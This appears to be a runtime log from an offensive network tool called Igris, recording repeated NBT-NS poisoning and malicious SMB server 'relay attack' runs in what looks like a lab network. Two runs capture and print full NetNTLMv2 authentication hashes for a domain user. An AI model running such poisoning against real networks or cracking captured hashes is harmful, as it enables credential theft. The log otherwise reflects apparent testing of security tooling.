2021-12-04 16:39:22.975 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:39:22.978 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:39:23.014 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:39:23.015 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:39:23.926 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:56:13.555 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:56:13.562 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:544 - Starting nbt-ns poisoning...
2021-12-04 16:56:13.563 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:56:13.568 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:56:13.569 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:56:13.570 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:56:40.532 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:56:40.536 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:56:40.575 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:56:40.577 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:56:40.825 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:57:01.213 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:57:01.216 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:57:01.251 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:57:01.253 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:57:01.306 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:57:03.940 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 16:58:31.608 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 16:58:31.615 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:544 - Starting nbt-ns poisoning...
2021-12-04 16:58:31.616 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 16:58:31.620 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 16:58:31.621 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 16:58:31.627 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 16:58:58.693 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:58:58.696 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:58:58.734 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:58:58.736 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:59:12.536 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:59:12.537 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 16:59:12.571 | WARNING  | scapy.packet:__str__:559 - Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:59:12.575 | WARNING  | scapy.packet:__str__:559 - more Calling str(pkt) on Python 3 makes no sense!
2021-12-04 16:59:12.576 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:519 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 16:59:15.132 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:04:01.199 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:04:01.204 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:543 - Starting nbt-ns poisoning...
2021-12-04 17:04:01.205 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:04:01.209 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:04:01.209 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:04:01.212 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:04:14.609 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:518 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:04:14.637 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.129,49887)
2021-12-04 17:04:14.650 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:518 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:04:14.773 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
2021-12-04 17:04:14.773 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-ALEX\apuia authenticated successfully
2021-12-04 17:04:14.784 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:c0451719409ee7cf7e841b239c2e0da8:0101000000000000007bdbf630e9d701f7733316beb2b8980000000001001000630073005000770061006a004b00640003001000630073005000770061006a004b0064000200100044007800680074004d004a00700078000400100044007800680074004d004a007000780007000800007bdbf630e9d70106000400020000000800300030000000000000000100000000200000b00025b57ee18ea21b2dfaa257329d0d4bf57affe71c4ad8cbfc05d7fa0ddf480a001000000000000000000000000000000000000900260063006900660073002f0063006f007200720065006500650065006d0061006d006f006f006f000000000000000000
2021-12-04 17:04:14.887 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
2021-12-04 17:04:14.925 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
2021-12-04 17:04:15.318 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-12-04 17:04:25.462 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
2021-12-04 17:04:25.468 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.129,49887)
2021-12-04 17:04:25.469 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
2021-12-04 17:04:31.568 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:14:22.789 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:14:22.803 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:547 - Starting nbt-ns poisoning...
2021-12-04 17:14:22.804 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:14:22.831 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:14:22.834 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:14:22.835 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:14:27.452 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:14:48.531 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:14:48.536 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:548 - Starting nbt-ns poisoning...
2021-12-04 17:14:48.537 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:14:48.540 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:14:48.540 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:14:48.541 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:14:49.664 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:26:13.447 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:26:13.455 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:548 - Starting nbt-ns poisoning...
2021-12-04 17:26:13.455 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:26:13.459 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:26:13.460 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:26:13.461 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:26:21.065 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:26:21.099 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:26:23.981 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:26:24.011 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.129,49912)
2021-12-04 17:26:24.030 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:26:24.039 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
2021-12-04 17:26:24.039 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-ALEX\apuia authenticated successfully
2021-12-04 17:26:24.042 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:f56dc33781e8c206a37c08a4060605ea:01010000000000000060990f34e9d701ffc34de7774f9e3b0000000001001000440069004a0057004300560051006a0003001000440069004a0057004300560051006a00020010007600590070004c0064004c0067005600040010007600590070004c0064004c0067005600070008000060990f34e9d70106000400020000000800300030000000000000000100000000200000b00025b57ee18ea21b2dfaa257329d0d4bf57affe71c4ad8cbfc05d7fa0ddf480a001000000000000000000000000000000000000900260063006900660073002f0063006f007200720065006500650065006d0061006d006f006f006f000000000000000000
2021-12-04 17:26:24.070 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-12-04 17:26:34.757 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
2021-12-04 17:26:34.760 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.129,49912)
2021-12-04 17:26:34.761 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
2021-12-04 17:26:37.644 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:29:30.994 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:29:31.012 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:549 - Starting nbt-ns poisoning...
2021-12-04 17:29:31.013 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:29:31.017 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:29:31.018 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:29:31.018 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:31:08.459 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:33:30.778 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:33:30.789 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:549 - Starting nbt-ns poisoning...
2021-12-04 17:33:30.790 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:33:30.797 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:33:30.799 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:33:30.801 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:34:13.437 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:37:21.457 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:37:21.462 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:550 - Starting nbt-ns poisoning...
2021-12-04 17:37:21.462 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:37:21.465 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:37:21.466 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:37:21.466 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:37:40.641 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:38:10.694 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:38:10.699 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:550 - Starting nbt-ns poisoning...
2021-12-04 17:38:10.700 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:38:10.704 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:38:10.712 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:38:10.713 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:38:25.658 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:39:05.674 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:39:05.679 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:39:05.680 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:39:05.684 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:39:05.685 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:39:05.685 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:39:42.976 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:41:08.578 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:41:08.583 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:41:08.584 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:41:08.587 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:41:08.588 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:41:08.588 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:41:30.711 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:41:30.751 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:41:57.472 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:41:57.513 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:42:00.232 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:44:39.151 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:44:39.156 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:44:39.156 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:44:39.160 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:44:39.161 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:44:39.164 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:45:07.802 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:45:07.862 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:45:09.305 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:45:09.353 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:45:16.744 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:46:57.662 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:46:57.672 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:46:57.673 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:46:57.681 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:46:57.690 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:46:57.692 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:47:08.593 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:47:08.630 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:47:24.908 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:47:34.403 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:47:34.417 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:47:34.419 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:47:34.437 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:47:34.439 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:47:34.442 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:47:43.929 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:47:57.169 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:47:57.182 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:47:57.183 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:47:57.195 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:47:57.208 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:47:57.210 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:48:05.809 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:48:05.855 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:48:07.592 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:48:07.638 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:48:18.848 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:02:38.988 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:02:39.000 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:02:39.001 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:02:39.008 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:02:39.015 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:02:39.017 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:03:02.551 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:03:38.843 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:03:38.851 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:03:38.852 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:03:38.856 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:03:38.857 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:03:38.860 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:03:56.901 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:04:48.424 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:04:48.430 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:04:48.430 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:04:48.436 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:04:48.441 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:04:48.442 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:05:07.736 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:06:24.953 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:06:24.959 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 18:06:24.959 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:06:24.964 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:06:24.967 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
